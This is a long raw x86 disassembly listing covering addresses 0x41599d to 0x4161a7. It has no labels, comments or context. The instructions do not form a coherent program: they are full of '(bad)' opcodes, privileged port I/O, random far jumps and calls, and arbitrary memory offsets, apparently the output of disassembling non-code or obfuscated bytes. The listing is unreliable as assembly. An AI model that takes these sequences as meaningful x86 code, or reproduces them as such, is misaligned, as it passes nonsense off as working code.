  41599d:	fcomi  st,st(2)
  41599f:	push   edi
  4159a0:	cdq    
  4159a1:	push   edx
  4159a2:	xor    BYTE PTR [edi+esi*2-0x7bc25e15],bh
  4159a9:	out    dx,eax
  4159aa:	mov    ecx,DWORD PTR [ebp-0x4c]
  4159ad:	jns    0x4159ba
  4159af:	sub    DWORD PTR [ebp-0x74],esp
  4159b2:	lds    edi,FWORD PTR [ebx+0x7caabe6b]
  4159b8:	inc    eax
  4159b9:	push   eax
  4159ba:	and    ecx,ecx
  4159bc:	push   ebx
  4159bd:	popa   
  4159be:	aam    0x79
  4159c0:	and    cl,al
  4159c2:	pop    esp
  4159c3:	(bad)  [ecx+0x23]
  4159c6:	rcl    ebx,cl
  4159c8:	add    al,BYTE PTR [eax]
  4159ca:	sbb    dh,BYTE PTR [ecx+eax*2-0x630bf348]
  4159d1:	pushf  
  4159d2:	sub    al,0xa2
  4159d4:	std    
  4159d5:	push   0xf0c833b7
  4159da:	das    
  4159db:	jl     0x4159bc
  4159dd:	xor    ecx,DWORD PTR [edi+ebp*8-0x77]
  4159e1:	pop    DWORD PTR [ebx+0x1ac37d88]
  4159e7:	sar    BYTE PTR [esi+eiz*4-0xa],1
  4159eb:	test   al,0xc
  4159ed:	xchg   ebx,eax
  4159ee:	inc    esi
  4159ef:	or     eax,0x69d709f8
  4159f4:	add    DWORD PTR [edi],esi
  4159f6:	stc    
  4159f7:	imul   edi,DWORD PTR [edx+eax*8+0xa],0x44
  4159fc:	sbb    eax,DWORD PTR [eax-0x1e]
  4159ff:	cmc    
  415a00:	cmp    eax,DWORD PTR [ecx]
  415a02:	xor    ah,BYTE PTR [eax-0x405e6a79]
  415a08:	es dec edi
  415a0a:	jge    0x415a83
  415a0c:	mov    dh,0xc4
  415a0e:	dec    eax
  415a0f:	or     al,0x7e
  415a11:	pop    ebp
  415a12:	inc    ebx
  415a13:	inc    esp
  415a14:	fidiv  WORD PTR [ebx+eiz*2]
  415a17:	add    ch,BYTE PTR [ecx]
  415a19:	pop    ecx
  415a1a:	cmp    ecx,ebp
  415a1c:	shr    DWORD PTR [ecx+ecx*4+0x36],cl
  415a20:	int    0xa1
  415a22:	and    esp,ebp
  415a24:	shl    ah,1
  415a26:	out    0x4f,al
  415a28:	xor    al,0xc1
  415a2a:	jmp    0x6003:0x82852162
  415a31:	daa    
  415a32:	cmp    DWORD PTR [eax],esi
  415a34:	push   esp
  415a35:	stos   DWORD PTR es:[edi],eax
  415a36:	jnp    0x4159dd
  415a38:	lock pushf 
  415a3a:	mov    WORD PTR ds:0xfae1c37c,gs
  415a40:	test   DWORD PTR [ecx-0x5d],esp
  415a43:	cld    
  415a44:	lea    eax,[esi-0x53]
  415a47:	ror    BYTE PTR ds:0x59561d47,1
  415a4d:	cs loope 0x415a41
  415a50:	xchg   edx,eax
  415a51:	lods   al,BYTE PTR ds:[esi]
  415a52:	pop    fs
  415a54:	mov    al,0xe6
  415a56:	shl    ebp,0x25
  415a59:	(bad)  
  415a5a:	test   DWORD PTR [esi-0x1063026e],0xa5235a87
  415a64:	sub    al,0x69
  415a66:	mov    bh,0x2c
  415a68:	pop    esp
  415a69:	aas    
  415a6a:	xchg   ebp,esp
  415a6c:	jecxz  0x415a73
  415a6e:	bound  edx,QWORD PTR [edi-0x5196d102]
  415a74:	xor    DWORD PTR [eax-0x70b3084],edi
  415a7a:	mov    ecx,0x9eb70332
  415a7f:	mov    ebp,0xf96f959
  415a84:	icebp  
  415a85:	sub    eax,0x2a6a47ca
  415a8a:	inc    BYTE PTR [ebx+0x37]
  415a8d:	adc    al,BYTE PTR [ebp+eiz*8+0x198df27a]
  415a94:	push   cs
  415a95:	jns    0x415aa4
  415a97:	inc    edi
  415a98:	push   edx
  415a99:	mov    bh,0xb9
  415a9b:	adc    BYTE PTR ds:0x2e93302c,0xbe
  415aa2:	bound  eax,QWORD PTR [eax]
  415aa4:	pop    esi
  415aa5:	sbb    esp,esp
  415aa7:	retf   
  415aa8:	xchg   ebx,eax
  415aa9:	(bad)  
  415aaa:	ss push esi
  415aac:	mov    esp,0xb6168633
  415ab1:	or     eax,0x3dd5fe25
  415ab6:	pop    ebx
  415ab7:	sub    esi,0xffffffd7
  415aba:	add    eax,0x74f8fa82
  415abf:	dec    ebx
  415ac0:	gs aam 0xa7
  415ac3:	push   edi
  415ac4:	in     eax,0xbb
  415ac6:	daa    
  415ac7:	ret    0x8461
  415aca:	scas   al,BYTE PTR es:[edi]
  415acb:	pusha  
  415acc:	test   BYTE PTR [eax+0x53874792],0x40
  415ad3:	add    eax,0x525aedea
  415ad8:	ss jbe 0x415ac1
  415adb:	mov    al,0x8f
  415add:	pop    ds
  415ade:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415adf:	add    al,0x10
  415ae1:	mov    ds:0xdc577a95,eax
  415ae6:	pop    edi
  415ae7:	rol    BYTE PTR [edi+0x677d6f51],1
  415aed:	pop    ebx
  415aee:	aaa    
  415aef:	inc    ebx
  415af0:	call   0x25c:0xf2255cb5
  415af7:	pop    ebx
  415af8:	ror    BYTE PTR ds:0x6e3bb0b0,1
  415afe:	jnp    0x415b4f
  415b00:	lea    edi,[edx-0x4b29b8d6]
  415b06:	mov    BYTE PTR [ebx],al
  415b08:	addr16 jnp 0x415b06
  415b0b:	mov    esi,0x1c544278
  415b10:	pushf  
  415b11:	shl    BYTE PTR [edi+ebp*8+0x65ac3ca5],1
  415b18:	sbb    esi,DWORD PTR [ebp+0x77]
  415b1b:	cmp    BYTE PTR [ebp+eiz*8-0xb9da05e],cl
  415b22:	aad    0x7b
  415b24:	mov    al,0x72
  415b26:	xor    BYTE PTR [edx+edx*2],dh
  415b29:	pop    edx
  415b2a:	shl    esp,cl
  415b2c:	ds enter 0xac12,0x1a
  415b31:	outs   dx,BYTE PTR ds:[esi]
  415b32:	je     0x415ba2
  415b34:	loop   0x415b8e
  415b36:	lods   al,BYTE PTR ds:[esi]
  415b37:	test   DWORD PTR [ecx],edx
  415b39:	jbe    0x415b17
  415b3b:	mov    bh,0xf7
  415b3d:	add    BYTE PTR [edi-0x45],dl
  415b40:	stc    
  415b41:	std    
  415b42:	push   esp
  415b43:	call   0x9684:0xe34d4bf0
  415b4a:	xlat   BYTE PTR ds:[ebx]
  415b4b:	pop    edx
  415b4c:	jnp    0x415b4b
  415b4e:	and    al,bl
  415b50:	xor    BYTE PTR [eax-0x3346334c],0x2f
  415b57:	cli    
  415b58:	sbb    DWORD PTR [ebp+ebx*1+0x6c],ebx
  415b5c:	mov    BYTE PTR [ecx],dh
  415b5e:	stos   BYTE PTR es:[edi],al
  415b5f:	add    BYTE PTR [edx],0xf6
  415b62:	cmp    edi,eax
  415b64:	adc    esi,DWORD PTR [edx+0x1f]
  415b67:	push   ebx
  415b68:	aad    0xd5
  415b6a:	dec    edx
  415b6b:	je     0x415afe
  415b6d:	test   eax,0xbd4aec32
  415b72:	cmp    eax,0x24159fc7
  415b77:	pop    ss
  415b78:	add    BYTE PTR [edi-0x78eaaaad],0x33
  415b7f:	enter  0x3b33,0x14
  415b83:	(bad)  
  415b84:	jmp    0xb814:0x8e25dd98
  415b8b:	and    al,0x25
  415b8d:	push   ds
  415b8e:	into   
  415b8f:	std    
  415b90:	retf   
  415b91:	leave  
  415b92:	cs xchg edx,eax
  415b94:	fcomp  QWORD PTR [eax+0x46f9695f]
  415b9a:	aad    0x92
  415b9c:	add    DWORD PTR [ebx+0x258ab75d],ecx
  415ba2:	xor    BYTE PTR [edx],cl
  415ba4:	arpl   WORD PTR [edi-0x5580de74],si
  415baa:	aam    0x79
  415bac:	mov    bh,0xe2
  415bae:	sub    eax,0x21b674b2
  415bb3:	cs inc ebx
  415bb5:	add    BYTE PTR [esi+0x7a488d00],0x44
  415bbc:	inc    ebp
  415bbd:	sub    DWORD PTR [eax],ecx
  415bbf:	pop    es
  415bc0:	adc    al,0x5d
  415bc2:	aas    
  415bc3:	push   0x9cb1717f
  415bc8:	jp     0x415c0d
  415bca:	pop    ecx
  415bcb:	hlt    
  415bcc:	ds push esi
  415bce:	adc    DWORD PTR [eax-0x4a],ebx
  415bd1:	dec    edx
  415bd2:	dec    ebx
  415bd3:	and    BYTE PTR [ecx],al
  415bd5:	aaa    
  415bd6:	mov    ah,0x50
  415bd8:	mov    ebp,0xc147030
  415bdd:	xchg   ecx,eax
  415bde:	cld    
  415bdf:	(bad)  
  415be0:	adc    DWORD PTR [eax],ebx
  415be2:	mov    ah,BYTE PTR [edi]
  415be4:	(bad)  
  415be5:	dec    edi
  415be6:	mov    bh,0x6d
  415be8:	das    
  415be9:	leavew 
  415beb:	sbb    cl,ch
  415bed:	mov    eax,0xc0fecf58
  415bf2:	jg     0x415bf1
  415bf4:	push   ebp
  415bf5:	push   es
  415bf6:	jge    0x415bbe
  415bf8:	mov    ecx,0x166326ee
  415bfd:	adc    dl,bh
  415bff:	cli    
  415c00:	cld    
  415c01:	pop    ss
  415c02:	int3   
  415c03:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415c04:	push   0x26ec301e
  415c09:	iret   
  415c0a:	sahf   
  415c0b:	enter  0x66b8,0x7a
  415c0f:	aaa    
  415c10:	add    eax,DWORD PTR [edx-0x38]
  415c13:	enter  0x8958,0xe
  415c17:	push   edx
  415c18:	mov    eax,0x39add5b5
  415c1d:	push   edi
  415c1e:	lea    ebp,[edx+eiz*4+0x31]
  415c22:	ds ja  0x415c4b
  415c25:	rcr    BYTE PTR [ecx+0x15],cl
  415c28:	out    dx,eax
  415c29:	adc    bh,BYTE PTR [ecx+edx*2-0x7cec2e02]
  415c30:	mov    BYTE PTR [edx+0x7d9fcc70],bh
  415c36:	xchg   edx,eax
  415c37:	js     0x415be8
  415c39:	in     al,dx
  415c3a:	or     eax,0x6a6ccc62
  415c3f:	scas   eax,DWORD PTR es:[edi]
  415c40:	fbld   TBYTE PTR [edi-0x2d]
  415c43:	or     ebx,DWORD PTR [ebp-0xf]
  415c46:	fbld   TBYTE PTR [ebp-0x2b56bf12]
  415c4c:	mov    eax,ds:0x81caf12d
  415c51:	in     al,dx
  415c52:	xor    al,0xf8
  415c54:	mov    WORD PTR [esi+edi*8],?
  415c57:	js     0x415c37
  415c59:	in     al,0x4d
  415c5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415c5c:	inc    ebx
  415c5d:	jno    0x415c71
  415c5f:	in     al,0x54
  415c61:	pop    ss
  415c62:	mov    dl,0x9d
  415c64:	or     bl,BYTE PTR [ebx-0xf811f77]
  415c6a:	add    BYTE PTR [ebx],al
  415c6c:	jbe    0x415cc7
  415c6e:	cmp    al,0x93
  415c70:	and    al,0xc7
  415c72:	jl     0x415c13
  415c74:	and    edx,edi
  415c76:	sbb    BYTE PTR [ecx],0xff
  415c79:	imul   ebp,DWORD PTR [edx+0x216afb69],0x27
  415c80:	loope  0x415c83
  415c82:	jbe    0x415c1c
  415c84:	xor    al,0x7d
  415c86:	out    dx,eax
  415c87:	mov    ds:0xb5b204dd,al
  415c8c:	(bad)  
  415c8d:	lods   al,BYTE PTR ds:[esi]
  415c8e:	inc    edx
  415c8f:	in     eax,0xaf
  415c91:	popa   
  415c92:	cmp    dh,BYTE PTR [ebx+edx*8]
  415c95:	add    esi,DWORD PTR [ecx+0x71b91cd3]
  415c9b:	pusha  
  415c9c:	xchg   edi,eax
  415c9d:	int3   
  415c9e:	imul   edi,DWORD PTR [edi],0x4d
  415ca1:	and    ch,bh
  415ca3:	or     eax,0xa3e2725b
  415ca8:	push   esp
  415ca9:	call   0xb13ab049
  415cae:	sbb    DWORD PTR [ebx+0x5aeb89ca],ebx
  415cb4:	loopne 0x415cc7
  415cb6:	mov    ds:0x62972820,eax
  415cbb:	or     ebx,ebx
  415cbd:	or     BYTE PTR [ebx-0x6f033d6d],ah
  415cc3:	xor    eax,0x25914001
  415cc8:	cmp    eax,0x9202b043
  415ccd:	stos   BYTE PTR es:[edi],al
  415cce:	or     BYTE PTR [edx-0x54],0x39
  415cd2:	push   0x2a2fd218
  415cd7:	lea    edi,[edi-0x6d]
  415cda:	mov    DWORD PTR [ebp+edx*4-0x2e3e13a1],edx
  415ce1:	push   ebp
  415ce2:	ficom  DWORD PTR cs:[edi-0x2ea177a2]
  415ce9:	or     dh,ah
  415ceb:	pop    DWORD PTR [ebp+eiz*1-0x1dfe3c8e]
  415cf2:	jb     0x415cff
  415cf4:	fstp   TBYTE PTR ss:[edi+0x1c]
  415cf8:	scas   al,BYTE PTR es:[edi]
  415cf9:	cwde   
  415cfa:	arpl   ax,sp
  415cfc:	push   ds
  415cfd:	pop    esp
  415cfe:	mov    al,ds:0x5818298b
  415d03:	pop    ebx
  415d04:	or     al,0x74
  415d06:	mov    edx,0x83caf16e
  415d0b:	mov    cl,0xfb
  415d0d:	or     eax,0xf2dac0
  415d12:	or     eax,0x475c9874
  415d17:	pop    esi
  415d18:	dec    ebp
  415d19:	jmp    0x5d3f:0x4e652f2e
  415d20:	daa    
  415d21:	cmp    eax,0x8787936c
  415d26:	sar    DWORD PTR [ecx+0xc9fbc58],0x4d
  415d2d:	in     eax,0xe1
  415d2f:	ins    BYTE PTR es:[edi],dx
  415d30:	leave  
  415d31:	adc    al,0xe
  415d33:	arpl   WORD PTR [eax+edx*1+0x68c2e3c2],sp
  415d3a:	faddp  st(1),st
  415d3c:	es inc ebp
  415d3e:	jl     0x415d8a
  415d40:	mov    WORD PTR [ebp-0x18],?
  415d43:	aas    
  415d44:	mov    ah,BYTE PTR [esi+0x72]
  415d47:	pop    ecx
  415d48:	fnsave [esi-0x2d850b8f]
  415d4e:	fcmovnb st,st(0)
  415d50:	std    
  415d51:	hlt    
  415d52:	ss dec ecx
  415d54:	mov    ebp,0xd6cb04dd
  415d59:	jg     0x415d6e
  415d5b:	or     DWORD PTR [edi],edx
  415d5d:	daa    
  415d5e:	push   cs
  415d5f:	cmc    
  415d60:	gs hlt 
  415d62:	mov    dl,0x40
  415d64:	adc    esp,edi
  415d66:	dec    esp
  415d67:	enter  0xa62a,0xf9
  415d6b:	je     0x415d11
  415d6d:	mov    dx,0xc251
  415d71:	jae    0x415d7e
  415d73:	add    DWORD PTR [edx+0x357c54d8],esi
  415d79:	mov    dh,0x9f
  415d7b:	es xchg edx,eax
  415d7d:	mov    eax,ds:0x36999d15
  415d82:	fsub   QWORD PTR [edx-0x35]
  415d85:	mov    esi,0xda934f7b
  415d8a:	leave  
  415d8b:	dec    edi
  415d8c:	popa   
  415d8d:	mov    edx,0xa59f276e
  415d92:	clc    
  415d93:	cmp    eax,DWORD PTR [ecx+ebx*2]
  415d96:	add    edi,DWORD PTR [ebx+0x37a26abd]
  415d9c:	push   edi
  415d9d:	or     ebx,DWORD PTR [ebx]
  415d9f:	lods   eax,DWORD PTR ds:[esi]
  415da0:	jns    0x415db1
  415da2:	rcr    DWORD PTR [esp+eiz*4],cl
  415da5:	dec    edx
  415da6:	sbb    eax,0x869f2a06
  415dab:	pop    ebp
  415dac:	push   0x11b1149f
  415db1:	lods   eax,DWORD PTR ds:[esi]
  415db2:	cmp    edi,DWORD PTR ds:[ebx-0x62916aef]
  415db9:	jo     0x415d8e
  415dbb:	icebp  
  415dbc:	mov    DWORD PTR [ecx],eax
  415dbe:	dec    ebp
  415dbf:	jno    0x415e37
  415dc1:	aad    0xf2
  415dc3:	add    ebx,ebp
  415dc5:	cmc    
  415dc6:	cmp    edx,DWORD PTR [edi-0x3a991e54]
  415dcc:	mov    eax,0xf06a1357
  415dd1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415dd2:	pop    ds
  415dd3:	sub    edx,DWORD PTR [edi]
  415dd5:	out    dx,al
  415dd6:	mov    bh,BYTE PTR ds:0x8491e90b
  415ddc:	retf   
  415ddd:	mov    ah,0xcc
  415ddf:	mov    bh,0x29
  415de1:	add    BYTE PTR [edx-0x4e],ch
  415de4:	xchg   ebp,eax
  415de5:	cmp    edx,DWORD PTR [ebp+0x72]
  415de8:	fldcw  WORD PTR [ecx+eiz*4-0x1a59537c]
  415def:	ja     0x415dae
  415df1:	push   0x39d16ceb
  415df6:	or     eax,0xec624708
  415dfb:	call   0xf730:0xbc92e6ae
  415e02:	and    al,0x3c
  415e04:	out    0xbe,eax
  415e06:	cli    
  415e07:	iret   
  415e08:	mov    ds:0xe38e1e24,eax
  415e0d:	or     eax,0x96746a06
  415e12:	fcomp  QWORD PTR [esi+0x71d8e08a]
  415e18:	cmp    ah,bh
  415e1a:	stc    
  415e1b:	pop    ss
  415e1c:	pop    esi
  415e1d:	jnp    0x415e16
  415e1f:	mov    ch,0x65
  415e21:	jl     0x415e67
  415e23:	(bad)  
  415e24:	jbe    0x415e0f
  415e26:	dec    esi
  415e27:	cli    
  415e28:	pop    ss
  415e29:	in     eax,dx
  415e2a:	xlat   BYTE PTR cs:[ebx]
  415e2c:	dec    ebp
  415e2d:	fist   DWORD PTR [esi-0x1e]
  415e30:	xchg   esp,eax
  415e31:	jle    0x415e80
  415e33:	cmp    DWORD PTR [esi-0x6d86ec6e],ebp
  415e39:	jmp    0x3bf5:0x5f13fe7f
  415e40:	push   ebx
  415e41:	das    
  415e42:	ret    0x9713
  415e45:	mov    esi,ebp
  415e47:	sahf   
  415e48:	sbb    BYTE PTR [eax+esi*1+0x78],al
  415e4c:	es gs (bad) 
  415e50:	pop    edx
  415e51:	int3   
  415e52:	jnp    0x415e2b
  415e54:	imul   edi,edx,0xf69a42b9
  415e5a:	xor    eax,0xd8d9f6b7
  415e5f:	popf   
  415e60:	gs mov dl,0x27
  415e63:	sbb    BYTE PTR [edx],ch
  415e65:	leave  
  415e66:	cli    
  415e67:	xchg   ecx,eax
  415e68:	xchg   di,ax
  415e6a:	stos   DWORD PTR es:[edi],eax
  415e6b:	mov    cl,0xf8
  415e6d:	pop    ss
  415e6e:	add    eax,0xce2fe9d
  415e73:	adc    al,0x3c
  415e75:	or     DWORD PTR [ebx-0x6],esi
  415e78:	pop    eax
  415e79:	fs repz pop edi
  415e7c:	leave  
  415e7d:	xor    edi,esp
  415e7f:	faddp  st(3),st
  415e81:	ret    0x602
  415e84:	add    ah,dl
  415e86:	mov    edi,0xfca3c77f
  415e8b:	xchg   esp,eax
  415e8c:	mov    sp,gs
  415e8f:	repnz inc edi
  415e91:	das    
  415e92:	jge    0x415edf
  415e94:	and    edi,DWORD PTR [esi-0x472acb4e]
  415e9a:	mov    dh,ch
  415e9c:	xchg   ebp,eax
  415e9d:	es or  al,0xf
  415ea0:	sub    ch,BYTE PTR [ebp-0x62c09e00]
  415ea6:	mov    ch,0xd8
  415ea8:	xchg   ecx,eax
  415ea9:	ret    
  415eaa:	dec    ebp
  415eab:	jecxz  0x415f2a
  415ead:	dec    esi
  415eae:	in     eax,0x62
  415eb0:	outs   dx,BYTE PTR ds:[esi]
  415eb1:	xlat   BYTE PTR ds:[ebx]
  415eb2:	inc    edx
  415eb3:	adc    BYTE PTR [ecx+0xddb2e5],ah
  415eb9:	enter  0xf58c,0xda
  415ebd:	lea    esp,[ebp+0x5cc41092]
  415ec3:	mov    ebp,0xd0201849
  415ec8:	sbb    bh,BYTE PTR [eax]
  415eca:	fisubr DWORD PTR [edi+0x418fd915]
  415ed0:	mov    eax,ds:0xb22b42e1
  415ed5:	test   al,0x7d
  415ed7:	mov    al,ds:0x1e4c09b9
  415edc:	and    BYTE PTR [ebp+0x289a9adb],al
  415ee2:	clc    
  415ee3:	mov    esi,DWORD PTR [edi-0x42]
  415ee6:	shr    DWORD PTR [edi-0x7ed3694],1
  415eec:	jns    0x415f41
  415eee:	int    0xda
  415ef0:	xor    eax,0x3abc2107
  415ef5:	enter  0x6677,0x91
  415ef9:	iret   
  415efa:	mov    edi,0xf5b58892
  415eff:	mov    edx,DWORD PTR [ebp+0x7547a5f8]
  415f05:	int3   
  415f06:	xor    DWORD PTR [edi-0x374f61d6],eax
  415f0c:	icebp  
  415f0d:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  415f0f:	lods   eax,DWORD PTR ds:[esi]
  415f10:	pop    edx
  415f11:	and    al,0x12
  415f13:	mov    al,ds:0xd79cd552
  415f18:	push   ecx
  415f19:	mov    ds:0x938feb8d,eax
  415f1e:	or     eax,0xb3c17cb4
  415f23:	outs   dx,DWORD PTR ds:[esi]
  415f24:	sub    eax,0xd16a3049
  415f29:	jne    0x415f55
  415f2b:	and    DWORD PTR [esi-0x28],0xfffffff4
  415f2f:	dec    eax
  415f30:	test   BYTE PTR gs:[esi],bl
  415f33:	pusha  
  415f34:	push   ds
  415f35:	aas    
  415f36:	pop    esp
  415f37:	cs jne 0x415f37
  415f3a:	or     esi,edx
  415f3c:	mov    ebp,DWORD PTR [ebp+esi*2+0x3237e5a6]
  415f43:	jle    0x415eed
  415f45:	push   esi
  415f46:	fist   DWORD PTR ds:0xe2c5a0cb
  415f4c:	jne    0x415fb1
  415f4e:	xor    cl,bl
  415f50:	add    edx,0x2df0f9d1
  415f56:	arpl   WORD PTR [edx+0x21],sp
  415f59:	pop    esp
  415f5a:	repnz test eax,0xdc25cea5
  415f60:	and    edx,DWORD PTR [ebp*2-0x5c6037ee]
  415f67:	rcl    DWORD PTR [esi+0x26],1
  415f6a:	arpl   WORD PTR [eax-0x19e59fcb],si
  415f70:	jle    0x415f77
  415f72:	out    0x1f,eax
  415f74:	icebp  
  415f75:	jne    0x415fa2
  415f77:	sar    cl,0xba
  415f7a:	stos   BYTE PTR es:[edi],al
  415f7b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415f7c:	ja     0x415f69
  415f7e:	mov    cl,bl
  415f80:	adc    eax,0xc5dd4314
  415f85:	lds    esi,FWORD PTR [ecx-0x54]
  415f88:	ss dec edx
  415f8a:	gs pop ebx
  415f8c:	inc    ebx
  415f8d:	mov    ch,0x34
  415f8f:	jp     0x415f43
  415f91:	jmp    0x2553d0f6
  415f96:	jbe    0x415f26
  415f98:	into   
  415f99:	push   0xffffffc1
  415f9b:	xchg   ebx,eax
  415f9c:	pop    edi
  415f9d:	sbb    dl,dl
  415f9f:	loopne 0x415fd1
  415fa1:	cmp    al,0xc
  415fa3:	cmc    
  415fa4:	mov    bl,0x3d
  415fa6:	fcom   DWORD PTR [edx-0x6d5f19b5]
  415fac:	mov    eax,ds:0x37c21319
  415fb1:	mov    bh,0x8c
  415fb3:	std    
  415fb4:	rcl    BYTE PTR [esi+0x6b9acf18],0xb3
  415fbb:	xchg   edx,esi
  415fbd:	mov    eax,0xe644d9be
  415fc2:	sbb    al,0xec
  415fc4:	push   ebp
  415fc5:	add    BYTE PTR [esi],dh
  415fc7:	ret    0x4620
  415fca:	push   cs
  415fcb:	ficomp DWORD PTR [esi]
  415fcd:	ror    BYTE PTR [esi+0x79],cl
  415fd0:	(bad)  
  415fd1:	icebp  
  415fd2:	jne    0x416012
  415fd4:	outs   dx,BYTE PTR ds:[esi]
  415fd5:	sub    esi,esi
  415fd7:	ret    0x4aa3
  415fda:	or     DWORD PTR [ecx-0x6eedb49e],eax
  415fe0:	cdq    
  415fe1:	mov    ebx,0xeb65a03
  415fe6:	clc    
  415fe7:	jge    0x415fbb
  415fe9:	mov    eax,ds:0x9a49f8e0
  415fee:	jmp    0xb469:0xfe0e106f
  415ff5:	sub    edx,DWORD PTR [edi]
  415ff7:	idiv   BYTE PTR [eax]
  415ff9:	arpl   WORD PTR [ebx+0x5c],cx
  415ffc:	test   DWORD PTR [eax+0x27],0xee04fc0b
  416003:	mov    es,WORD PTR [eax]
  416005:	mov    esi,eax
  416007:	faddp  st(1),st
  416009:	or     eax,DWORD PTR ds:0xff11225
  41600f:	sar    DWORD PTR [ebx-0x12],1
  416012:	stos   DWORD PTR es:[edi],eax
  416013:	int    0xbe
  416015:	push   ds
  416016:	push   ecx
  416017:	sbb    DWORD PTR [ebx-0x27289a1],0x37
  41601e:	les    esp,FWORD PTR [eax+0x7c]
  416021:	jo     0x416003
  416023:	jecxz  0x415fae
  416025:	je     0x415fda
  416027:	and    DWORD PTR ds:0x7ebf0b3b,edi
  41602d:	mov    esp,0x420ab74e
  416032:	cmp    al,0x50
  416034:	mov    eax,ds:0x83d9e9ab
  416039:	cmp    esi,DWORD PTR [ebp-0x3411b717]
  41603f:	in     al,dx
  416040:	cld    
  416041:	sti    
  416042:	retf   0xbbc3
  416045:	and    BYTE PTR [edi+0xc],dh
  416048:	or     BYTE PTR ss:[eax+eax*8-0x48],dl
  41604d:	js     0x416012
  41604f:	pop    ebp
  416050:	mov    dh,0x93
  416052:	sar    DWORD PTR [esi],1
  416054:	jne    0x416089
  416056:	sub    ebp,DWORD PTR [edi-0xf7d078f]
  41605c:	sub    cl,bh
  41605e:	(bad)  
  416060:	pop    edx
  416061:	dec    ebx
  416062:	and    edx,DWORD PTR [edx+0x3a]
  416065:	mov    dh,BYTE PTR [esi]
  416067:	sbb    ah,BYTE PTR [ecx]
  416069:	cs lahf 
  41606b:	push   ecx
  41606c:	loope  0x41601e
  41606e:	lahf   
  41606f:	les    edx,FWORD PTR [edx+ecx*2]
  416072:	add    dh,ah
  416074:	xchg   ecx,eax
  416075:	out    0xc2,al
  416077:	ror    DWORD PTR [edx-0x39],1
  41607a:	add    BYTE PTR [ebx-0x4f],0xad
  41607e:	jnp    0x416019
  416080:	pusha  
  416081:	xor    eax,0x6a953413
  416086:	pop    esp
  416087:	push   edx
  416088:	lods   al,BYTE PTR ds:[esi]
  416089:	sar    BYTE PTR [edi+0x599a11f6],cl
  41608f:	imul   eax,DWORD PTR [ebx+0x78],0xffffffdf
  416093:	shl    DWORD PTR [edi],cl
  416095:	nop
  416096:	retf   0x435c
  416099:	mov    ch,0x56
  41609b:	repnz mov esi,0x485adfb6
  4160a1:	fs cmp dl,al
  4160a4:	pop    ebx
  4160a5:	idiv   BYTE PTR [ecx-0x7d]
  4160a8:	rol    eax,1
  4160aa:	mov    cl,0xa8
  4160ac:	sbb    al,0x59
  4160ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4160af:	or     ebx,DWORD PTR [ecx+0x1d]
  4160b2:	lahf   
  4160b3:	push   eax
  4160b4:	arpl   si,bp
  4160b6:	daa    
  4160b7:	push   ebp
  4160b8:	cmc    
  4160b9:	sub    eax,0x8ab1eb16
  4160be:	call   DWORD PTR [edi]
  4160c0:	cwde   
  4160c1:	adc    bl,ah
  4160c3:	hlt    
  4160c4:	xchg   ebx,eax
  4160c5:	mov    ah,0x85
  4160c7:	cli    
  4160c8:	int3   
  4160c9:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  4160cb:	or     esp,0x3358fad7
  4160d1:	jle    0x416144
  4160d3:	or     DWORD PTR [esi+0x4f],0xcab1d945
  4160da:	sbb    edx,DWORD PTR [ebx+eiz*4]
  4160dd:	lods   al,BYTE PTR ds:[esi]
  4160de:	mov    dl,0x2
  4160e0:	mov    cl,0xd0
  4160e2:	mov    gs,WORD PTR [eax-0x45]
  4160e5:	push   esi
  4160e6:	sbb    cl,BYTE PTR [ebx+0x1b]
  4160e9:	mov    ch,bl
  4160eb:	gs mov ah,0xd9
  4160ee:	inc    esi
  4160ef:	adc    eax,0x9650cc59
  4160f4:	jmp    DWORD PTR [ebp-0x38f59573]
  4160fa:	sbb    dl,0x5e
  4160fd:	test   al,0xb8
  4160ff:	test   BYTE PTR [esi+0x4e0e751f],bl
  416105:	sbb    edx,DWORD PTR [eax]
  416107:	mov    esi,0xd2c4293b
  41610c:	bound  edx,QWORD PTR [edi-0x68]
  41610f:	mov    esi,0xb15dfd9e
  416114:	sub    al,0xa0
  416116:	mov    eax,0xd18bc231
  41611b:	add    al,0x75
  41611d:	sub    esi,DWORD PTR [ecx+0x6822507f]
  416123:	scas   al,BYTE PTR es:[edi]
  416124:	sub    eax,DWORD PTR [edx]
  416126:	add    DWORD PTR [ebx+0x5e99faff],0xffffff88
  41612d:	repz in eax,dx
  41612f:	pop    ebx
  416130:	stos   BYTE PTR es:[edi],al
  416131:	out    0x66,eax
  416133:	and    cl,cl
  416135:	idiv   DWORD PTR [edx-0x1]
  416138:	fist   DWORD PTR [edi-0x4]
  41613b:	fsub   DWORD PTR [eax-0x42]
  41613e:	sub    dl,BYTE PTR [esi]
  416140:	fs out 0x4b,eax
  416143:	lods   al,BYTE PTR ds:[esi]
  416144:	arpl   WORD PTR [ebp+0x55],bx
  416147:	jb     0x41612e
  416149:	mov    ebx,0x80e89845
  41614e:	pop    ebx
  41614f:	out    0x79,al
  416151:	popf   
  416152:	pop    ds
  416153:	sar    BYTE PTR [ebx-0x5e],1
  416156:	or     al,0x80
  416158:	dec    eax
  416159:	mov    al,0x2
  41615b:	clc    
  41615c:	add    DWORD PTR [ebx+0x63],ecx
  41615f:	gs jns 0x4161d2
  416162:	xchg   edx,eax
  416163:	(bad)  
  416164:	mov    WORD PTR [eax],es
  416166:	test   cl,ch
  416168:	repz retf 
  41616a:	cli    
  41616b:	cmp    eax,0x5f371ba2
  416170:	ss add esp,edx
  416173:	lahf   
  416174:	sbb    al,0x7c
  416176:	cmp    al,0x83
  416178:	fidiv  WORD PTR [ebx+0x427adaff]
  41617e:	pop    ecx
  41617f:	out    0x7f,eax
  416181:	sbb    ecx,0x34dd701b
  416187:	mov    edi,0xf900c3f4
  41618c:	mov    bh,BYTE PTR ds:0xf376533b
  416192:	(bad)  
  416193:	arpl   WORD PTR [esi+ecx*1+0x3e2b9cb],bp
  41619a:	ficom  DWORD PTR [ebx+esi*2+0x2d]
  41619e:	cld    
  41619f:	arpl   WORD PTR [eax],bx
  4161a1:	mov    bh,0xd8
  4161a3:	add    ebp,DWORD PTR [ebx]
  4161a5:	or     eax,DWORD PTR [eax]
  4161a7:	and    al,0x48
